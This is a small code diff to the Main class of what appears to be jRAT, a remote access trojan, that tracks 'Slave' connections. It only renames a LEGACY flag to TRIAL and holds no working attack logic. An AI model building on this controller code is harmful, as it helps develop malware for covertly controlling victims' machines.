@@ -28,7 +28,7 @@ import pro.jrat.utils.TrayIconUtils;
 
 public class Main {
 	
-	public static final boolean LEGACY = true;
+	public static final boolean TRIAL = true;
 	public static final List<Slave> connections = new ArrayList<Slave>();
 
 	public static boolean debug;
